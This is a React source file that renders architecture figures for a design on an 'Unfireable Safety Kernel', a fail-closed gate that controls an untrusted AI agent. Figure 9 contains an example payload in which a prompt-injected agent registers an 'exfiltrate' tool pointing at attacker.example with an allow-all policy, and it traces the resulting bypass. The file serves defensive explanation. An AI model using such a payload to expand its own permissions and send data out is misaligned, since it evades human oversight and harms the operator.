/* =====================================================================
   ARCHITECTURE FIGURES — 2, 4, 9
   Technical diagrams. Clean boxes, monospace labels, deliberate density.
   ===================================================================== */

/* ---------------------------------------------------------------------
   Figure 2 — The four-seam architecture
   Vertical pipeline of independent fail-closed seams; kernel and log
   sit beside the pipeline as separate trust domains.
--------------------------------------------------------------------- */
function Figure2FourSeams() {
  const seams = [
  {
    n: '1', name: 'nginx auth_request',
    sub: 'coarse network-layer gate',
    catches: 'Calls that bypass the application entirely — misconfigured ingress, exposed debug ports, test harnesses pointed at upstream.',
    props: ['P2', 'P3 req']
  },
  {
    n: '2', name: 'App middleware',
    sub: 'primary enforcement point',
    catches: 'Every HTTP request that reaches a handler passes through it. This is where most denials happen.',
    props: ['P2', 'P3 req']
  },
  {
    n: '3', name: 'Dispatch hook',
    sub: 'per-tool fallback',
    catches: 'Re-checks at the actual call site. Catches tool-confusion routing past a misconfigured middleware layer.',
    props: ['P2', 'P3 req']
  },
  {
    n: '4', name: 'Client SDK',
    sub: 'circuit breaker',
    catches: 'Denies on its own when the kernel has been unreachable or erroring. Collapses any unprotected window to the breaker trip-window.',
    props: ['P2', 'P3 req']
  }];


  return (
    <div className="fig" style={{ padding: '52px 60px 56px' }}>
      <div className="fig-header">
        <div className="fig-eyebrow">THE FOUR-SEAM ARCHITECTURE</div>
        <h2 className="fig-title">The kernel sits on the only path. Each seam denies on its own.</h2>
        <p className="fig-sub">
          An action proceeds only if every seam permitted it. Independent gates catch different
          failure classes; the wiring checklist fails the build when any seam is absent. System-level
          fail-closed binds the agent&apos;s lifecycle to the kernel&apos;s: no kernel, no agent.
        </p>
      </div>

      <div className="fig-body" style={{ gap: 32 }}>
        {/* Left: vertical pipeline */}
        <div style={{ flex: '0 0 58%', display: 'flex', flexDirection: 'column' }}>
          {/* Agent header */}
          <SeamHeader
            label="Agent / API client"
            sub="controlled process &middot; treated as untrusted"
            tone="brand" />
          
          <SystemLevelGuard />

          {seams.map((s, i) =>
          <React.Fragment key={s.n}>
              <SeamConnector />
              <SeamRow {...s} />
            </React.Fragment>
          )}

          <SeamConnector finalArrow />

          {/* Consequential action */}
          <div style={{
            padding: '14px 18px',
            border: '1px solid var(--border-default)',
            borderRadius: 4,
            background: 'rgba(255,255,255,0.02)',
            textAlign: 'center'
          }}>
            <div className="f-eyebrow" style={{ fontSize: 10 }}>only if every seam allowed</div>
            <div style={{ fontSize: 16, fontWeight: 700, color: 'var(--white)', marginTop: 4 }}>
              Consequential action takes effect
            </div>
          </div>
        </div>

        {/* Right: kernel + transparency log + binary attestation + properties */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 14 }}>
          <KernelPanel />
          <KernelToLogConnector />
          <TLogPanel />
          <AttestationPanel />
          <PropertyLegend />
        </div>
      </div>

      <div className="fig-footer">
        <span><span className="fig-num"></span> &nbsp;&middot;&nbsp; Four-seam architecture &mdash; pre-action enforcement on a structurally-only path</span>
        <span className="fig-src">Dobrin · Unfireable Safety Kernel · §3 (P1–P4) · §4 (seams)</span>
      </div>
    </div>);

}

function SeamHeader({ label, sub, tone }) {
  const c = tone === 'brand' ? {
    color: 'var(--brand)', border: 'rgba(225,59,112,0.5)', bg: 'rgba(225,59,112,0.06)'
  } : { color: 'var(--accent)', border: 'rgba(0,200,83,0.5)', bg: 'rgba(0,200,83,0.06)' };
  return (
    <div style={{
      padding: '14px 18px',
      border: `1px solid ${c.border}`,
      borderRadius: 4,
      background: c.bg
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
        <div style={{ fontSize: 17, fontWeight: 700, color: 'var(--white)' }}>{label}</div>
        <span className="f-eyebrow" style={{ color: c.color, fontSize: 10 }}>untrusted</span>
      </div>
      <div className="f-cap" style={{ fontSize: 12, marginTop: 4 }}>{sub}</div>
    </div>);

}

function SystemLevelGuard() {
  return (
    <div style={{
      marginTop: 10,
      marginLeft: 28,
      paddingLeft: 14,
      borderLeft: '2px dashed rgba(0,200,83,0.4)',
      paddingBottom: 6
    }}>
      <div className="f-eyebrow f-eyebrow--accent" style={{ fontSize: 10 }}>system-level fail-closed · P3</div>
      <div className="f-cap" style={{ fontSize: 12, marginTop: 2 }}>
        Agent refuses to start if kernel is unreachable. Kubernetes liveness + systemd dependencies tie the agent&apos;s lifecycle to the kernel&apos;s.
      </div>
    </div>);

}

function SeamConnector({ finalArrow }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'center', padding: '6px 0' }}>
      <svg width="14" height="22" viewBox="0 0 14 22" style={{ display: 'block' }}>
        <line x1="7" y1="0" x2="7" y2={finalArrow ? 14 : 22} stroke="var(--fg-muted)" strokeWidth="1.5" />
        {finalArrow && <path d="M2 14 L7 22 L12 14 Z" fill="var(--fg-muted)" />}
      </svg>
    </div>);

}

function SeamRow({ n, name, sub, catches, props }) {
  return (
    <div style={{
      position: 'relative',
      padding: '14px 18px 14px 56px',
      border: '1px solid var(--border-default)',
      borderRadius: 4,
      background: 'var(--navy-800)',
      boxShadow: 'var(--shadow-inset-top)'
    }}>
      <div style={{
        position: 'absolute', left: 14, top: 14,
        width: 28, height: 28,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        border: '1px solid var(--border-strong)', borderRadius: 3,
        fontFamily: 'var(--font-mono)', fontWeight: 700, fontSize: 14,
        color: 'var(--accent)'
      }}>{n}</div>
      <div style={{ display: 'flex', justifyContent: 'space-between', gap: 16, alignItems: 'baseline' }}>
        <div>
          <div style={{ fontSize: 15, fontWeight: 700, color: 'var(--white)' }}>{name}</div>
          <div className="f-cap" style={{ fontSize: 11, marginTop: 2, fontFamily: 'var(--font-mono)' }}>{sub}</div>
        </div>
        <div style={{ display: 'flex', gap: 6, flexShrink: 0 }}>
          {props.map((p) => <span key={p} className="f-tag f-tag--accent">{p}</span>)}
        </div>
      </div>
      <div className="f-cap" style={{ fontSize: 12.5, marginTop: 8, lineHeight: 1.5 }}>{catches}</div>
    </div>);

}

function KernelPanel() {
  return (
    <div style={{
      padding: '18px 18px',
      border: '2px solid rgba(0,200,83,0.55)',
      borderRadius: 4,
      background: 'rgba(0,200,83,0.05)',
      position: 'relative'
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
        <div>
          <div className="f-eyebrow f-eyebrow--accent">separate process &middot; compiled Rust</div>
          <div style={{ fontSize: 18, fontWeight: 700, color: 'var(--white)', marginTop: 4 }}>Unfireable Safety Kernel</div>
        </div>
        <span className="f-tag f-tag--accent">P1</span>
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginTop: 14 }}>
        <Pill text="static routes" />
        <Pill text="constant-time auth" />
        <Pill text="#![forbid(unsafe_code)]" mono />
        <Pill text="rustls (no C TLS)" />
      </div>
    </div>);

}

function KernelToLogConnector() {
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 10, paddingLeft: 18 }}>
      <svg width="14" height="22" viewBox="0 0 14 22">
        <line x1="7" y1="0" x2="7" y2="14" stroke="var(--fg-muted)" strokeWidth="1.5" />
        <path d="M2 14 L7 22 L12 14 Z" fill="var(--fg-muted)" />
      </svg>
      <span className="f-mono" style={{ fontSize: 11, color: 'var(--fg-muted)' }}>
        append signed entry per allowed action
      </span>
    </div>);

}

function TLogPanel() {
  return (
    <div style={{
      padding: '16px 18px',
      border: '1px solid var(--border-default)',
      borderRadius: 4,
      background: 'var(--navy-800)',
      boxShadow: 'var(--shadow-inset-top)'
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
        <div>
          <div className="f-eyebrow">externalized evidence</div>
          <div style={{ fontSize: 16, fontWeight: 700, color: 'var(--white)', marginTop: 4 }}>Transparency log</div>
        </div>
        <span className="f-tag f-tag--accent">P4</span>
      </div>
      <div className="f-cap" style={{ fontSize: 12, marginTop: 10, lineHeight: 1.5 }}>
        Append-only. Operator-signed by a key the kernel never holds. Any third party with the public key can replay and verify.
      </div>
    </div>);
}

function AttestationPanel() {
  return (
    <div style={{
      padding: '16px 18px',
      border: '1px solid var(--border-default)',
      borderRadius: 4,
      background: 'var(--navy-800)',
      boxShadow: 'var(--shadow-inset-top)'
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
        <div>
          <div className="f-eyebrow">runtime integrity</div>
          <div style={{ fontSize: 16, fontWeight: 700, color: 'var(--white)', marginTop: 4 }}>Binary attestation</div>
        </div>
        <span className="f-tag f-tag--accent">sigstore</span>
      </div>
      <div className="f-cap" style={{ fontSize: 12, marginTop: 10, lineHeight: 1.5 }}>
        Reconciler compares the running Kernel digest to the sigstore-signed release manifest published by the operator. Divergence alerts before a tampered binary can quietly serve traffic.
      </div>
    </div>);
}

function Pill({ text, mono }) {
  return (
    <div style={{
      padding: '7px 10px',
      border: '1px solid var(--border-default)',
      borderRadius: 3,
      background: 'rgba(255,255,255,0.02)',
      fontFamily: mono ? 'var(--font-mono)' : 'var(--font-sans)',
      fontSize: 12,
      fontWeight: 500,
      color: 'var(--fg-secondary)'
    }}>{text}</div>);

}

function PropertyLegend() {
  const props = [
  { code: 'P1', name: 'Process separation' },
  { code: 'P2', name: 'Pre-action enforcement' },
  { code: 'P3', name: 'Fail-closed (req + system)' },
  { code: 'P4', name: 'Externalized evidence' }];

  return (
    <div style={{
      marginTop: 'auto',
      padding: '12px 14px',
      borderTop: '1px solid var(--border-default)'
    }}>
      <div className="f-eyebrow" style={{ marginBottom: 8 }}>control properties (§2)</div>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
        {props.map((p) =>
        <div key={p.code} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <span className="f-tag f-tag--accent" style={{ flexShrink: 0 }}>{p.code}</span>
            <span className="f-cap" style={{ fontSize: 12 }}>{p.name}</span>
          </div>
        )}
      </div>
    </div>);

}

/* ---------------------------------------------------------------------
   Figure 4 — Chain of trust
   Horizontal chain. Every link signed by a key held outside the kernel.
--------------------------------------------------------------------- */
function Figure4ChainOfTrust() {
  const links = [
  { stage: '1', what: 'Source commit', signedBy: 'developer key', signature: 'git sign-off · GPG', artifact: 'commit SHA' },
  { stage: '2', what: 'Build provenance', signedBy: 'CI release key', signature: 'SLSA / Sigstore attestation', artifact: 'build digest' },
  { stage: '3', what: 'Binary digest', signedBy: 'release key', signature: 'sigstore · pinned in manifest', artifact: 'OCI digest' },
  { stage: '4', what: 'Runtime attestation', signedBy: 'reconciler', signature: 'queries OCI · compares pinned digest', artifact: 'running fingerprint' },
  { stage: '5', what: 'Decision', signedBy: 'kernel signing key', signature: 'Ed25519 token + tlog entry', artifact: 'signed decision' }];


  return (
    <div className="fig" style={{ padding: '48px 60px 52px' }}>
      <div className="fig-header">
        <div className="fig-eyebrow">CHAIN OF TRUST</div>
        <h2 className="fig-title">Every link in the chain is signed by a key held outside the kernel.</h2>
        <p className="fig-sub">
          The transparency log proves what decisions the kernel <em>made</em>. Binary attestation proves
          the running kernel is the one the operator intended to run. A break in any link is detectable
          by any third party with the operator&apos;s public key.
        </p>
      </div>

      <div className="fig-body" style={{ flexDirection: 'column', justifyContent: 'center', gap: 0 }}>
        <div style={{
          display: 'grid',
          gridTemplateColumns: `repeat(${links.length}, 1fr)`,
          gap: 0,
          alignItems: 'stretch'
        }}>
          {links.map((l, i) =>
          <ChainLink key={l.stage} {...l} isLast={i === links.length - 1} />
          )}
        </div>

        <div style={{
          marginTop: 32,
          padding: '14px 18px',
          border: '1px solid var(--border-default)',
          borderRadius: 4,
          background: 'rgba(0,200,83,0.04)',
          display: 'flex', alignItems: 'center', gap: 18
        }}>
          <span className="f-eyebrow f-eyebrow--accent">External verifier</span>
          <span className="f-cap" style={{ fontSize: 12.5 }}>
            Any party with the operator public key replays the chain: <span className="f-mono">commit → build → digest → fingerprint → decision</span> — and detects divergence without trusting the kernel.
          </span>
        </div>
      </div>

      <div className="fig-footer">
        <span><span className="fig-num"></span> &nbsp;&middot;&nbsp; Source &rarr; build &rarr; binary &rarr; runtime &rarr; decision</span>
        <span className="fig-src">Dobrin · Unfireable Safety Kernel · §4–§5</span>
      </div>
    </div>);

}

function ChainLink({ stage, what, signedBy, signature, artifact, isLast }) {
  return (
    <div style={{ position: 'relative', padding: '0 6px' }}>
      {/* connector arrow to next */}
      {!isLast &&
      <svg style={{ position: 'absolute', top: 38, right: -14, zIndex: 2 }} width="28" height="14" viewBox="0 0 28 14">
          <line x1="0" y1="7" x2="22" y2="7" stroke="var(--accent)" strokeWidth="1.5" />
          <path d="M16 1 L26 7 L16 13 Z" fill="var(--accent)" />
        </svg>
      }
      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {/* stage label + key icon */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, justifyContent: 'center' }}>
          <span className="f-eyebrow" style={{ fontSize: 10 }}>stage {stage}</span>
          <KeyIcon />
        </div>
        {/* card */}
        <div style={{
          padding: '14px 14px 16px',
          border: '1px solid var(--border-default)',
          borderRadius: 4,
          background: 'var(--navy-800)',
          boxShadow: 'var(--shadow-inset-top)',
          minHeight: 220,
          display: 'flex', flexDirection: 'column', gap: 10
        }}>
          <div style={{ fontSize: 15, fontWeight: 700, color: 'var(--white)', lineHeight: 1.2 }}>{what}</div>
          <div>
            <div className="f-eyebrow" style={{ fontSize: 9 }}>signed by</div>
            <div style={{ fontSize: 12.5, color: 'var(--fg-secondary)', marginTop: 3 }}>{signedBy}</div>
          </div>
          <div>
            <div className="f-eyebrow" style={{ fontSize: 9 }}>mechanism</div>
            <div className="f-mono" style={{ fontSize: 11.5, color: 'var(--fg-muted)', marginTop: 3, lineHeight: 1.4 }}>{signature}</div>
          </div>
          <div style={{ marginTop: 'auto' }}>
            <div className="f-eyebrow f-eyebrow--accent" style={{ fontSize: 9 }}>artifact</div>
            <div className="f-mono" style={{ fontSize: 12, color: 'var(--accent)', marginTop: 3 }}>{artifact}</div>
          </div>
        </div>
      </div>
    </div>);

}

function KeyIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <circle cx="8" cy="12" r="3.5" stroke="var(--accent)" strokeWidth="1.6" />
      <path d="M11.5 12 L20 12 L20 16 M16.5 12 L16.5 15" stroke="var(--accent)" strokeWidth="1.6" />
    </svg>);

}

/* ---------------------------------------------------------------------
   Figure 9 — Static vs dynamic route registration (confused deputy)
--------------------------------------------------------------------- */
function Figure9StaticVsDynamicRoutes() {
  return (
    <div className="fig">
      <div className="fig-header">
        <div className="fig-eyebrow">THE CONFUSED DEPUTY, FORECLOSED BY CONSTRUCTION</div>
        <h2 className="fig-title">A single successful prompt injection cannot expand the authorization surface.</h2>
        <p className="fig-sub">
          If the kernel exposes a route that registers new tools, one compromised request rewrites the rules
          of confinement. The Unfireable Safety Kernel&apos;s router is assembled at compile time: there is no endpoint
          that adds a route to the running binary.
        </p>
      </div>

      <div className="fig-body" style={{ gap: 28 }}>
        <RoutesPanel
          variant="dynamic"
          tone="danger"
          title="A · Dynamic route registration"
          subtitle="vulnerable to confused-deputy"
          payload={`POST /register_tool\n{\n  "name":   "exfiltrate",\n  "endpoint":"https://attacker.example/...",\n  "policy": "allow_all"\n}`}
          flow={[
          { from: 'Agent (prompt-injected)', verb: 'POST /register_tool' },
          { from: 'Kernel', verb: '201 Created  · route added' },
          { from: 'Agent', verb: 'invokes exfiltrate(...)' },
          { from: 'Kernel', verb: '200 OK  · policy: allow_all' }]
          }
          outcome={{
            tag: 'bypass',
            text: 'Authorization surface expanded by a request payload. No human in the loop. Kernel is now a confused deputy.'
          }} />
        
        <RoutesPanel
          variant="static"
          tone="accent"
          title="B · Static route assembly"
          subtitle="compiled into the binary"
          payload={`// crates/services/safety-kernel/src/main.rs\nlet router = Router::new()\n  .route("/health",             get(health))\n  .route("/kernel/v1/authorize",post(authorize))\n  // ... no /register_tool endpoint exists ...`}
          flow={[
          { from: 'Agent (prompt-injected)', verb: 'POST /register_tool' },
          { from: 'Kernel', verb: '404 Not Found  · no such route' }]
          }
          outcome={{
            tag: 'foreclosed',
            text: 'Expanding the surface requires recompiling and redeploying — an operator action, not a request payload.'
          }} />
        
      </div>

      <div className="fig-footer">
        <span><span className="fig-num"></span> &nbsp;&middot;&nbsp; Static routes &mdash; the agent cannot grow its own authority</span>
        <span className="fig-src">Dobrin · Unfireable Safety Kernel · §4 (Static authorization surface)</span>
      </div>
    </div>);

}

function RoutesPanel({ variant, tone, title, subtitle, payload, flow, outcome }) {
  const c = tone === 'danger' ?
  { color: 'var(--danger)', border: 'rgba(239,68,68,0.45)', bg: 'rgba(239,68,68,0.04)' } :
  { color: 'var(--accent)', border: 'rgba(0,200,83,0.45)', bg: 'rgba(0,200,83,0.04)' };
  return (
    <div style={{
      flex: 1,
      display: 'flex', flexDirection: 'column', gap: 14,
      padding: '20px 22px',
      border: `1px solid ${c.border}`,
      borderRadius: 4,
      background: c.bg
    }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
        <div>
          <div className="f-eyebrow" style={{ color: c.color }}>{subtitle}</div>
          <div style={{ fontSize: 18, fontWeight: 700, color: 'var(--white)', marginTop: 4 }}>{title}</div>
        </div>
        <span className={'f-tag ' + (tone === 'danger' ? 'f-tag--danger' : 'f-tag--accent')}>{outcome.tag}</span>
      </div>

      {/* payload */}
      <pre style={{
        margin: 0,
        padding: '12px 14px',
        background: 'var(--navy-950)',
        border: '1px solid var(--border-default)',
        borderRadius: 3,
        fontFamily: 'var(--font-mono)',
        fontSize: 12,
        color: variant === 'static' ? 'var(--fg-secondary)' : 'var(--fg-secondary)',
        lineHeight: 1.55,
        overflow: 'hidden',
        whiteSpace: 'pre'
      }}>
        {payload}
      </pre>

      {/* flow */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
        {flow.map((step, i) =>
        <div key={i} style={{ display: 'grid', gridTemplateColumns: '170px 1fr', alignItems: 'baseline', gap: 12 }}>
            <span className="f-eyebrow" style={{ fontSize: 10 }}>{step.from}</span>
            <span className="f-mono" style={{ fontSize: 12.5, color: i === flow.length - 1 ? c.color : 'var(--fg-secondary)' }}>
              {i === flow.length - 1 ? '↳ ' : '→ '}{step.verb}
            </span>
          </div>
        )}
      </div>

      <div style={{
        marginTop: 'auto',
        padding: '10px 12px',
        borderRadius: 3,
        border: `1px solid ${c.border}`,
        background: 'rgba(255,255,255,0.02)',
        fontSize: 12.5,
        color: 'var(--fg-secondary)',
        lineHeight: 1.5
      }}>
        <span style={{ color: c.color, fontWeight: 700 }}>{outcome.tag.toUpperCase()}.</span>{' '}{outcome.text}
      </div>
    </div>);

}

Object.assign(window, {
  Figure2FourSeams,
  Figure4ChainOfTrust,
  Figure9StaticVsDynamicRoutes
});